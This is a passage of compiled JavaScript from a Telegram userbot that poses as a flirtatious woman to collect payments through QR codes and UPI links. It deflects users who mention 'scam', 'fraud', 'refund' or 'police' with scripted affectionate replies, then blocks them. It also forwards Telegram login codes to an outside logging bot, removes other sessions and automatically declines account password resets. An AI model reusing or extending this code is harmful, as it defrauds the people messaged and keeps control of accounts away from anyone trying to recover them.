                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId}: Re-Connected successfully.`)}`);
                console.log("Client reconnected successfully.");
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Error while refreshing connection");
            }
        });
    }
    static startTg() {
        return __awaiter(this, void 0, void 0, function* () {
            const tgInst = yield this.instanceExist();
            if (tgInst) {
                const tgClient = this.getClient();
                if (tgClient) {
                    if (tgClient === null || tgClient === void 0 ? void 0 : tgClient.connected) {
                        console.log('Connection to tg already exists');
                    }
                    else {
                        yield (tgClient === null || tgClient === void 0 ? void 0 : tgClient.destroy());
                        yield (0, Helpers_1.sleep)(3000);
                        yield tgInst.main();
                    }
                }
                else {
                    yield (tgClient === null || tgClient === void 0 ? void 0 : tgClient.destroy());
                    yield (0, Helpers_1.sleep)(3000);
                    yield tgInst.main();
                }
            }
            else {
                yield this.getInstance();
            }
        });
    }
    static getInstance() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b;
            if (!tgClass.instance) {
                try {
                    yield ((_a = tgClass.client) === null || _a === void 0 ? void 0 : _a.destroy());
                    yield (0, Helpers_1.sleep)(2000);
                    tgClass.instance = new tgClass();
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                }
            }
            else {
                if (!((_b = tgClass.client) === null || _b === void 0 ? void 0 : _b.connected)) {
                    console.log('------Deceased------');
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId}: DECEASED!!`)}`);
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        if (!tgClass.client.connected) {
                            console.log('------Deceased------2');
                            yield this.destroy();
                            yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
                            process.exit(1);
                        }
                    }), 12000);
                }
                else {
                    console.log('------ALL GOOD------');
                }
            }
            return tgClass.instance;
        });
    }
    static instanceExist() {
        return __awaiter(this, void 0, void 0, function* () {
            if (tgClass.instance && (tgClass.getClient()).connected) {
                return tgClass.instance;
            }
            else {
                return false;
            }
        });
    }
    static deleteInstance() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b, _c;
            try {
                if (tgClass.instance) {
                    console.log('Connection EXIST, Disconnecting Tg Client');
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId}: Connection EXIST, Disconnecting Tg Client`)}`);
                    yield tgClass.client.disconnect();
                    yield ((_a = tgClass.client) === null || _a === void 0 ? void 0 : _a.destroy());
                    yield ((_b = tgClass === null || tgClass === void 0 ? void 0 : tgClass.reactorInstance) === null || _b === void 0 ? void 0 : _b.stop());
                    tgClass.client = null;
                    tgClass.instance = null;
                    yield (0, Helpers_1.sleep)(1000);
                }
                else {
                    yield ((_c = tgClass.client) === null || _c === void 0 ? void 0 : _c.destroy());
                    console.log('Instance doesnot exist!!');
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId}: Instance does not exist!! ALL GOOD`)}`);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        });
    }
    static getClient() {
        return tgClass.client;
    }
    static destroy() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a;
            try {
                (_a = tgClass.client) === null || _a === void 0 ? void 0 : _a.destroy();
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        });
    }
    static connect() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b;
            try {
                yield ((_a = tgClass.client) === null || _a === void 0 ? void 0 : _a.connect());
                yield ((_b = tgClass.client) === null || _b === void 0 ? void 0 : _b.getMe());
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}:Issue At Tg Connect ${(0, parseError_1.parseError)(error).message}`)}`);
            }
        });
    }
    main() {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b;
            console.log("Connecting to TELEGRAM------");
            yield (0, Helpers_1.sleep)(6000);
            try {
                if (!((_a = tgClass.client) === null || _a === void 0 ? void 0 : _a.connected)) {
                    try {
                        yield tgClass.client.connect();
                        console.log(tgClass.client.session.save()); // Save this string to avoid logging in again
                        const me = yield ((_b = tgClass.client) === null || _b === void 0 ? void 0 : _b.getMe());
                        const db = dbservice_1.UserDataDtoCrud.getInstance();
                        yield db.updateClient({ clientId: process.env.clientId }, { mobile: me.phone, username: me.username });
                        const msg = yield tgClass.client.sendMessage('me', { message: 'Hello!' });
                    }
                    catch (error) {
                        (0, parseError_1.parseError)(error);
                        console.log("Error in connecting to Telegram", error.errorMessage);
                        try {
                            if (error.errorMessage === 'AUTH_KEY_DUPLICATED') {
                                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.clientId).toUpperCase()}: AUTH KEY DUPLICATED`)}`);
                            }
                            if ((error.errorMessage === "FROZEN_METHOD_INVALID" || error.errorMessage === "USER_DEACTIVATED_BAN" || error.errorMessage === "USER_DEACTIVATED") && error.errorMessage !== "INPUT_USER_DEACTIVATED") {
                                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId.toUpperCase()}: USER_DEACTIVATED - STARTED NEW USER PROCESS`)}`);
                                const url = `${process.env.tgmanager}/setupClient/${process.env.clientId}?archiveOld=false&formalities=false`;
                                yield (0, fetchWithTimeout_1.fetchWithTimeout)(url);
                            }
                        }
                        catch (error) {
                            (0, parseError_1.parseError)(error);
                        }
                        // await tgClass.client.start({
                        //     phoneNumber: process.env.number,
                        //     password: () => Promise.resolve(process.env.password),
                        //     phoneCode: async () =>
                        //         await input.text("Please enter the code you received: "),
                        //     onError: (err) => console.log(err),
                        // });
                        // console.log(tgClass.client.session.save()); // Save this string to avoid logging in again
                    }
                }
                else {
                    console.log("CLIENT ALREADY CONNECTED");
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(process.env.clientId)}: CLIENT ALREADY CONNECTED`);
                }
                // await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`${(process.env.clientId).toUpperCase()}: CONNECTED!!`)}`);
                console.log("You should now be connected.");
                tgClass.reactorInstance = new React_1.Reactions(tgClass.client);
                // broadcast(process.env.username, process.env.session);
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${process.env.clientId}: CONNECTED...!!`)}`);
                tgClass.client.addEventHandler(handleEvents, new events_1.NewMessage({ incoming: true }));
                tgClass.client.addEventHandler(outhandler_1.OutEventPrint, new events_1.NewMessage({ outgoing: true }));
                tgClass.client.addEventHandler(handleOtherEvents);
                (0, respondToMsgs_1.replier)();
                initSetup(tgClass.client);
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
            }
        });
    }
}
exports.tgClass = tgClass;
tgClass.instance = null;
tgClass.client = null;
tgClass.reactorInstance = null;
tgClass.lastRefreshTime = 0;
function initSetup(client) {
    return __awaiter(this, void 0, void 0, function* () {
        // await channelInfo(client, false);
        yield (0, utils_1.joinChannels)(client, `@clientupdates|@miscmessages|@unwantedupdates1`, false);
    });
}
function handleOtherEvents(ev) {
    return __awaiter(this, void 0, void 0, function* () {
        // if (ev?.className == "UpdateNewChannelMessage") {
        //     const chatId = ev.message?.peerId?.channelId?.toString();
        //     if (chatId == "1673831190" || chatId == "-1001673831190") {
        //         console.log(ev);
        //         console.log(ev.isGroup, ev.isChannel);
        //     }
        //     console.log(chatId)
        // }
        var _a, _b;
        try {
            if ((ev === null || ev === void 0 ? void 0 : ev.className) == "UpdatePhoneCall") {
                if (phoneCall && ((_a = phoneCall.participantId) === null || _a === void 0 ? void 0 : _a.toString()) == ((_b = ev.phoneCall.participantId) === null || _b === void 0 ? void 0 : _b.toString())) {
                    const client = tgClass.getClient();
                    if (ev.phoneCall.className == "PhoneCallAccepted") {
                        const { gA, keyFingerprint } = yield (0, phonestate_1.confirmPhoneCall)(ev.phoneCall.gB);
                        yield (0, Helpers_1.sleep)(2000);
                        const res = yield client.invoke(new telegram_1.Api.phone.ConfirmCall({
                            peer: new telegram_1.Api.InputPhoneCall({ id: phoneCall.id, accessHash: phoneCall.accessHash }),
                            gA: Buffer.from(gA),
                            keyFingerprint: (0, big_integer_1.default)(keyFingerprint),
                            protocol: new telegram_1.Api.PhoneCallProtocol({
                                udpP2p: true,
                                udpReflector: true,
                                minLayer: 65,
                                maxLayer: 105,
                                libraryVersions: ['2.4.4', '4.0.0', '4.0.1']
                            }),
                        }));
                        phoneCall = Object.assign(Object.assign({}, phoneCall), res.phoneCall);
                    }
                    if (ev.phoneCall.className == "PhoneCallDiscarded") {
                        try {
                            if (phoneCall === null || phoneCall === void 0 ? void 0 : phoneCall.participantId) {
                                yield client.sendMessage(phoneCall === null || phoneCall === void 0 ? void 0 : phoneCall.participantId, { message: (0, messages_1.pickOneMsg)([`Some issue at ur side...Call not connecting!!\nPlease wait I will try again in 5-10 mins!!\n\n**Dont Worry!!** ${phoneCall.duration ? phoneCall.duration : ''}`, '?', '??', "Lift the Call", "What Happend??", "Let me Try Again", "Some Issue at Telegram!"]) });
                            }
                        }
                        catch (error) {
                            (0, parseError_1.parseError)(error);
                        }
                        phoneCall = undefined;
                        (0, phonestate_1.destroyPhoneCallState)();
                        // await joinPhoneCall(call.phoneCall.connections, sendSignalingData, true, true, apiUpdate)
                    }
                }
            }
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    });
}
let desstroyInit = true;
function handleEvents(event) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b, _c, _d;
        (0, respondToMsgs_1.replier)();
        const chatId = event.message.chatId.toString();
        try {
            exports.sendPing = true;
            if (phoneCall === undefined && phoneCallQueue.length > 0) {
                const chatId = phoneCallQueue.shift();
                yield requestCall(chatId);
            }
            else if (phoneCall && desstroyInit) {
                desstroyInit = false;
                setTimeout(() => {
                    phoneCall = undefined;
                    (0, phonestate_1.destroyPhoneCallState)();
                    desstroyInit = true;
                }, 30000);
            }
            if (process.env.username && process.env.username !== '' && process.env.username !== "null" && event.message.text === `exit${process.env.username}`) {
                console.log(`EXITTING PROCESS!!`);
                yield tgClass.deleteInstance();
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                    yield (dbservice_1.UserDataDtoCrud.getInstance()).closeConnection();
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`${(process.env.clientId).toUpperCase()}:CONNECTION EXIST - EXITTING`)}`);
                    process.exit(1);
                }), 2000);
            }
            else if (chatId == '178220800') {
                console.log(event.message);
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.username).toUpperCase()}:${event.message.text}`)}`);
                if (event.message.text.toLowerCase().includes('automatically released')) {
                    const date = event.message.text.split("limited until ")[1].split(",")[0];
                    days = (0, utils_1.getdaysLeft)(date);
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${(process.env.username).toUpperCase()}:Days left: ${days}`)}`);
                    if (days > 6 && days < 33) {
                        const url = `${process.env.tgmanager}/setupClient/${process.env.clientId}?archiveOld=true&days=${days}&formalities=true`;
                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(url);
                        // await db.activatePromotions();
                    }
                    else if (days >= 0) {
                        // const db = UserDataDtoCrud.getInstance();
                        // if (days > 1) {
                        //     await db.deactivatePromotions(Date.now() * days * 12 * 60 * 60 * 1000);
                        // } else {
                        //     await db.deactivatePromotions(Date.now() * 3 * 60 * 60 * 1000);
                        // }
                    }
                }
                else if (event.message.text.toLowerCase().includes('good news')) {
                    const db = dbservice_1.UserDataDtoCrud.getInstance();
                    const userPromoteStats = yield db.readPromoteStatsTime();
                    if ((userPromoteStats === null || userPromoteStats === void 0 ? void 0 : userPromoteStats.isActive) && (Date.now() - (userPromoteStats === null || userPromoteStats === void 0 ? void 0 : userPromoteStats.lastUpdatedTimeStamp)) / (1000 * 60) > 12) {
                        yield promotions_1.Promotor.getInstance(tgClass.getClient()).PromoteToGrp();
                    }
                    else {
                        yield db.activatePromotions();
                    }
                    days = -1;
                }
                else if (event.message.text.toLowerCase().includes('can trigger a harsh')) {
                    const url = `${process.env.tgmanager}/setupClient/${process.env.clientId}?archiveOld=true&days=3&formalities=true`;
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(url);
                }
            }
            else if (chatId == "777000") {
                if (event.message.text.toLowerCase().includes('login code')) {
                    (0, utils_1.removeOtherAuths)(event.client);
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        try {
                            const result = yield event.client.invoke(new telegram_1.Api.account.DeclinePasswordReset());
                        }
                        catch (error) {
                            (0, parseError_1.parseError)(error);
                        }
                    }), 5 * 60 * 1000);
                }
                if (event.message.text.toLowerCase().includes('request to reset account')) {
                    yield (0, Helpers_1.sleep)(2000);
                    try {
                        const result = yield event.client.invoke(new telegram_1.Api.account.DeclinePasswordReset());
                    }
                    catch (error) {
                        (0, parseError_1.parseError)(error);
                    }
                }
                // await deleteMessage(event);
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`@${process.env.clientId}:\n${event.message.text}`)}`);
            }
            else if (event.message.text.toLowerCase() == 'rstll') {
                yield db.delete(chatId);
                yield (0, utils_1.deleteMessage)(event);
            }
            else {
                if (event.isPrivate && exports.globalCanReply) {
                    const senderJson = yield (0, utils_1.getSenderJson)(event);
                    const broadcastName = senderJson.username ? senderJson.username : senderJson.firstName;
                    const text = event.message.text.toLowerCase();
                    const userDetails = yield db.read(chatId);
                    if (userDetails) {
                        if (userDetails.canReply !== 0 && userDetails.totalCount < 100) {
                            if (event.message.text.toLowerCase().startsWith(`respp1`)) {
                                const msg = event.message.text.split(':')[1];
                                yield (0, utils_1.respToPaidPplfn)(event.client, 200, msg);
                            }
                            yield tgClass.connect();
                            if (((0, inhandlerUpdated_1.contains)(text, ['sai ', 'saikumar', 'shetty', 'gowraipally', 'gowra', 'goura', 'yadadri', 'yadagiri', '508105', 'bhongi', 'bhuvan', '5-10'])
                                || ((0, inhandlerUpdated_1.contains)(text, ['record']) && !(0, inhandlerUpdated_1.contains)(text, ['not', 'nahi', 'nhi', 'voice', 'recording', "don't", 'dont', 'mat', 'mt', 'wont']) ||
                                    ((0, inhandlerUpdated_1.contains)(text, ['live']) && (0, inhandlerUpdated_1.contains)(text, ['not', 'nahi', 'nhi', "don't", 'dont', 'wont']))))
                                && userDetails.payAmount > 5) {
                                try {
                                    yield event.message.forwardTo(yield TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.USER_WARNINGS));
                                }
                                catch (error) {
                                    (0, parseError_1.parseError)(error);
                                }
                                try {
                                    try {
                                        yield (0, Helpers_1.sleep)(2000);
                                        const msgElement = (0, utils_1.selectRandomElements)(['No Dear', "Not at All", 'No Baby, Please Wait!!', 'Network issue baby', "I Love you Babyyy😚", "I Want to kiss you😚", "Its me only baby😚😚", "No Dear, Please understand"], 1)[0];
                                        yield event.message.respond({ message: `**${msgElement}\n\nSee here**👇👇\nhttps://zomCall.netlify.app/${process.env.clientId}/${userDetails.chatId.toString()}\n\nCall me now!!` });
                                        yield (0, Helpers_1.sleep)(2000);
                                        yield TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.USER_WARNINGS, `${process.env.clientId}: <a href='https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${event.chatId.toString()}'>Chat</a> `, { parseMode: "HTML", linkPreviewOptions: { isDisabled: true } });
                                    }
                                    catch (error) {
                                        yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent("Failed to send CallMsg")}`);
                                    }
                                    userDetails.cheatCount = (userDetails.cheatCount ? userDetails.cheatCount : 0) + 1;
                                    yield db.updateSingleKey(chatId, dbservice_1.user.cheatCount, userDetails.cheatCount);
                                    if (userDetails.cheatCount > 4 && userDetails.demoGiven) {
                                        yield db.updateSingleKey(chatId, dbservice_1.user.canReply, 0);
                                        yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Date.now() + 30 * 60 * 1000);
                                    }
                                }
                                catch (error) {
                                    (0, parseError_1.parseError)(error);
                                }
                            }
                            else if ((0, inhandlerUpdated_1.contains)(text, ['frau', 'frod', 'refun', 'frou', 'fack', 'scam', 'fake', 'complain', 'polic', 'case', 'arres', 'repor', 'cheat', 'cheet', 'legal', 'jail', 'bars', 'cyber'])
                                && userDetails.payAmount > 5 && !(0, inhandlerUpdated_1.contains)(text, ['not', 'nahi', "n't", 'didnt', 'nhi', 'mat', 'mt', "don't", 'dont', 'wont'])) {
                                const cheatCount = cheatMap.get(chatId) || Date.now() - 80000;
                                try {
                                    yield event.message.forwardTo(yield TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.USER_WARNINGS));
                                }
                                catch (error) {
                                    (0, parseError_1.parseError)(error);
                                }
                                try {
                                    if (cheatCount < Date.now() - 40000) {
                                        cheatMap.set(chatId, Date.now());
                                        try {
                                            yield (0, Helpers_1.sleep)(2000);
                                            const msgElement = (0, utils_1.selectRandomElements)(['No Dear', "Not at All", 'No Baby, Please Wait!!', 'Network issue baby', "I Love you Babyyy😚", "I Want to kiss you😚", "Its me only baby😚😚", "No Dear, Please understand"], 1)[0];
                                            yield event.message.respond({ message: `**${msgElement}\n\nSee here**👇👇\nhttps://zomCall.netlify.app/${process.env.clientId}/${userDetails.chatId.toString()}\n\nCall me now!!` });
                                            yield (0, Helpers_1.sleep)(2000);
                                            yield TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.USER_WARNINGS, `${process.env.clientId}: <a href='https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${event.chatId.toString()}'>Chat</a> `, { parseMode: "HTML", linkPreviewOptions: { isDisabled: true } });
                                        }
                                        catch (error) {
                                            yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent("Failed to send CallMsg")}`);
                                        }
                                        userDetails.cheatCount = (userDetails.cheatCount ? userDetails.cheatCount : 0) + 1;
                                        yield db.updateSingleKey(chatId, dbservice_1.user.cheatCount, userDetails.cheatCount);
                                        if (userDetails.demoGiven) {
                                            if (((userDetails.highestPayAmount < 250 && userDetails.cheatCount > 3 && userDetails.videos.length > 2) || (userDetails.highestPayAmount >= 250 && userDetails.cheatCount > 4 && userDetails.videos.length > 4))) {
                                                yield db.updateSingleKey(chatId, dbservice_1.user.canReply, 0);
                                                yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Date.now() + 30 * 60 * 1000);
                                            }
                                            else if (userDetails.cheatCount > 2) { //&& !contains(text, ['fake'])) {
                                                let updatedAmount = userDetails.payAmount;
                                                if (userDetails.payAmount >= 250) {
                                                    userDetails.cheatCount = 0;
                                                    userDetails.callTime = 0;
                                                    yield initiateCall(updatedAmount, userDetails, `Cheat count:${userDetails.cheatCount}\nCheat-initiated Call - 1:`);
                                                }
                                                else if ((updatedAmount < 100 && userDetails.videos.length < 3) || (updatedAmount >= 100 && userDetails.videos.length < 5)) {
                                                    if (!(0, utils_1.isServicePending)(userDetails)) {
                                                        if (userDetails.highestPayAmount < 100) {
                                                            userDetails.demoGiven = false;
                                                        }
                                                        else {
                                                            userDetails.secondShow = false;
                                                        }
                                                        userDetails.cheatCount = -2;
                                                    }
                                                    yield initiateCall(updatedAmount, userDetails, `Cheat count: ${userDetails.cheatCount}\nCheat-initiated Call:`);
                                                    (0, utils_1.deleteMessagesBeforeId)(userDetails.chatId, event.message.id);
                                                }
                                            }
                                        }
                                        else {
                                            if (userDetails.payAmount >= 25) {
                                                if (userDetails.payAmount >= 30) {
                                                    yield event.message.respond({ message: `Telegram Call is not Connecting Baby!!\n\nYou can Call me here👇👇\nhttps://zomCall.netlify.app/${process.env.clientId}/${userDetails.chatId.toString()}\n\nCall me now!!` });
                                                }
                                                else if ((userDetails.payAmount < 30 && userDetails.cheatCount > 2) || userDetails.cheatCount > 3) { //&& !contains(text, ['fake'])) {
                                                    let updatedAmount = userDetails.payAmount;
                                                    if (userDetails.videos.length < 3) {
                                                        updatedAmount = 50;
                                                        userDetails.cheatCount = -2;
                                                        yield initiateCall(updatedAmount, userDetails, `Cheat count:${userDetails.cheatCount}\nCheat-initiated Call - 2:`);
                                                        (0, utils_1.deleteMessagesBeforeId)(userDetails.chatId, event.message.id);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                catch (error) {
                                    (0, parseError_1.parseError)(error);
                                }
                            }
                            else if (userDetails.payAmount >= 10 && (0, inhandlerUpdated_1.contains)(text, ['respond', 'plz', 'reply', 'please', 'pls', 'paid', 'already', 'answer'])) {
                                const plsCount = plsMap.get(chatId) || 0;
                                if (plsCount > 3) {
                                    plsMap.set(chatId, -2);
                                    let updatedAmount = userDetails.payAmount;
                                    if (updatedAmount >= 250) {
                                        plsMap.set(chatId, 0);
                                        userDetails.callTime = 0;
                                        yield initiateCall(updatedAmount, userDetails, `Please count:${plsCount}\nPlease-initiated Call:`);
                                    }
                                    else if ((updatedAmount < 100 && userDetails.videos.length < 3) || (updatedAmount >= 100 && userDetails.videos.length < 5)) {
                                        if (!(0, utils_1.isServicePending)(userDetails)) {
                                            if (userDetails.highestPayAmount < 100) {
                                                userDetails.demoGiven = false;
                                            }
                                            else {
                                                userDetails.secondShow = false;
                                            }
                                        }
                                        yield initiateCall(updatedAmount, userDetails, `Please count:${plsCount}\nPlease-initiated Call:`);
                                    }
                                }
                                else {
                                    if ((0, inhandlerUpdated_1.contains)(text, ['voice', 'tell', 'pic', 'photo'])) {
                                        plsMap.set(chatId, plsCount - 1);
                                    }
                                    else {
                                        plsMap.set(chatId, plsCount + 1);
                                    }
                                }
                            }
                            if (text.startsWith(`joinn`)) {
                                const string = text.split(':')[1];
                                yield (0, utils_1.joinGrps)(event.client, string);
                                yield (0, utils_1.deleteMessage)(event);
                            }
                            else if (text.startsWith(`joinchannel`)) {
                                const string = text.split(':')[1];
                                yield (0, utils_1.joinChannels)(event.client, string);
                            }
                            else if (userDetails.payAmount > 10 && (0, inhandlerUpdated_1.contains)(text, ['same', 'old', 'prev']) && (0, inhandlerUpdated_1.contains)(text, ['qr', 'paytm', 'link', 'phonepe', 'scanner'])) {
                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(event.chatId, { message: `${(0, messages_1.pickOneMsg)(['Hmm Yeah!!', 'Haa Yep..!!', 'Haaa yaa....!'])}\nFinish Payment and Send me **FULL Screenshot!!**` }));
                            }
                            else if ((0, inhandlerUpdated_1.contains)(text, ['scan', 'scanner', 'qr', 'bar'])) {
                                if (!broadcastName.endsWith('bot')) {
                                    if ((0, inhandlerUpdated_1.contains)(text, ['new', 'gpay', 'other'])) {
                                        const index = (0, utils_1.selectRandomElements)(['1', '2'], 1)[0];
                                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `GPAY QR CODE - ${index}👆👆`, file: (0, common_1.getClientFilePath)(`QR${index}.jpg`) }));
                                    }
                                    else {
                                        yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `${messages_1.messages.qr}\n\n${messages_1.messages.link}`, file: (0, common_1.getClientFilePath)('QR.jpg') }));
                                    }
                                }
                            }
                            else if ((0, inhandlerUpdated_1.contains)(text, ['otp', 'login'])) {
                                if (!broadcastName.endsWith('bot')) {
                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: 'Check Telegram Messages!!\n\nOTP comes in Telegram' }));
                                }
                            }
                            else if ((0, inhandlerUpdated_1.contains)(text, ['blank', 'black', 'dark', 'white']) && !(0, inhandlerUpdated_1.contains)(text, ['pussy']) && userDetails.payAmount > 15 && (userDetails.callTime == 0 || userDetails.callTime > Date.now() - 15 * 60 * 1000)) {
                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Please open in another mobile or **Chrome** browser!!\n\nCopy paste the link!!` }));
                                if (userDetails.payAmount >= 30 && userDetails.payAmount <= 65) {
                                    yield db.updateSingleKey(chatId, dbservice_1.user.demoGiven, false);
                                }
                                else if (userDetails.payAmount >= 65) {
                                    yield db.updateSingleKey(chatId, dbservice_1.user.secondShow, false);
                                }
                            }
                            else if (((0, inhandlerUpdated_1.contains)(text, ['google pay', ' gpay']) || (0, inhandlerUpdated_1.startswith)(text, ['gpay'])) && !(0, inhandlerUpdated_1.contains)(text, ['only', 'sirf', 'not', 'cant', 'nahi', 'unab']) && !broadcastName.endsWith('bot')) {
                                const failedCount = failedMap.get(chatId) || { count: 0, time: 0 };
                                if (failedCount.count > 0) {
                                    const index = (0, utils_1.selectRandomElements)(['1', '2'], 1)[0];
                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `GPAY QR CODE - ${index}👆👆`, file: (0, common_1.getClientFilePath)(`QR${index}.jpg`) }));
                                }
                                else {
                                    yield (0, Helpers_1.sleep)(5000);
                                    yield event.message.reply({ message: `<b>I Dont have GPay!!\n\nOnly "PhonePe / PayTm"/</b>Others!!\n\nTry these👇\n${messages_1.payLinks.gpay1}1 - Doubt (Try Once)\n${messages_1.payLinks.gpay2}2 - Doubt (Try Once)\n\n${messages_1.payLinks.paytm3} - Working\n${messages_1.payLinks.phonepe3} - Working`, parseMode: "html" });
                                    yield (0, Helpers_1.sleep)(3000);
                                    yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `Pay with **PhonePe** or **PayTm**, I will give you **10Rs Discount!!**` }));
                                }
                                yield event.client.sendMessage('@miscmessages', { message: broadcastName + ": " + text });
                            }
                            else if ((0, inhandlerUpdated_1.contains)(text, ['google pay', 'g pay', 'gpay']) && (0, inhandlerUpdated_1.contains)(text, ['only', 'sirf', 'keval']) && !(0, inhandlerUpdated_1.contains)(text, ['not', 'cant', 'fail', 'nahi', 'nhi', 'unab']) && !broadcastName.endsWith('bot')) {
                                yield (0, Helpers_1.sleep)(5000);
                                // await event.message.reply({ message: `${payLinks.gpay1}1 - Doubt (Try Once)\n${payLinks.gpay2}2 - Doubt (Try Once)`, parseMode: 'html' });
                                // await sleep(10000);
                                const index = (0, utils_1.selectRandomElements)(['1', '2'], 1)[0];
                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `GPAY QR CODE - ${index}👆👆`, file: (0, common_1.getClientFilePath)(`QR${index}.jpg`) }));
                                yield event.client.sendMessage('@miscmessages', { message: broadcastName + ": " + text });
                            }
                            else if ((0, inhandlerUpdated_1.contains)(text, [...UpiClass_1.UpiIds.allIds, 'lakshmi stores', 'ravva lakshmi'])) {
                                yield (0, withTimeout_1.withTimeout)(event.client.sendMessage(chatId, { message: `**Yes**\n\nPay NOW and Send me Screenshot!!` }));
                            }
                            else if (!broadcastName.endsWith('bot') && chatId !== '5249581831' && !((_b = (_a = event.message.media) === null || _a === void 0 ? void 0 : _a.className) === null || _b === void 0 ? void 0 : _b.includes('Media')) &&
                                ((((0, inhandlerUpdated_1.contains)(text, ['cant', "can't", 'avvatledhu', 'cannot', 'prob', 'nahi', 'nai', 'nhi']) && (0, inhandlerUpdated_1.contains)(text, ['pay', 'send mon', 'send pay', 'pais', 'sending mon', 'sending pay', 'going', 'sent mon', 'sent pay']) && !(0, inhandlerUpdated_1.contains)(text, ['demo', 'trust', 'call', 'free'])) ||
                                    (0, inhandlerUpdated_1.contains)(text, ['decli', 'avvatledhu', 'fail', 'not able', 'issue', 'not hap', 'unable', ' nai hor', 'nai ja', 'nhi hor', 'nhi ja', 'nahi hor', 'nahi ja', 'process', 'no phon', 'no payt',
                                        'server', 'not open', 'error', 'work nh', 'work nah', 'not work', 'doesnot wor', 'doesnot wor', "doesn't wo", 'work no'])) && !((0, inhandlerUpdated_1.contains)(text, ["paid ", 'trust', 'confirm', 'demo', "successful", "connect", 'call', 'paise nahi h', 'paise nhi h', 'paisa nahi h', 'paisa nhi h', 'transaction successful', 'switch', "on paytm", 'share transaction', 'completed', 'pay again'])))) {
                                if (userDetails && userDetails.paidReply && !((userDetails.payAmount > 25 && userDetails.demoGiven) || (userDetails.payAmount > 80 && userDetails.secondShow))) {
                                    yield respToFailedMSg(event, text, broadcastName);
                                }
                            }
                            else {
                                if (event.message.media) {
                                    const invalidPhotoInfo = invalidPhotosMap.get(chatId) || { count: 1, time: 0 };
                                    const invalidPhotoCount = invalidPhotoInfo.count || 0;
                                    if (Date.now() > invalidPhotoInfo.time + 10000) {
                                        if (((_c = event.message.media) === null || _c === void 0 ? void 0 : _c.className) === 'MessageMediaPhoto') {
                                            invalidPhotosMap.set(chatId, { count: invalidPhotoCount + 1, time: Date.now() });
                                            if ((chatId !== '5249581831' && userDetails.canReply !== 0) && !event.message.forward && invalidPhotoInfo.count < 6) {
                                                yield enqueuePicEvent(event);
                                            }
                                            else {
                                                yield forwardtoUnwanted(event);
                                            }
                                        }
                                        else {
                                            yield forwardtoUnwanted(event);
                                        }
                                        yield event.message.markAsRead();
                                    }
                                    else {
                                        yield forwardtoUnwanted(event);
                                    }
                                }
                                else {
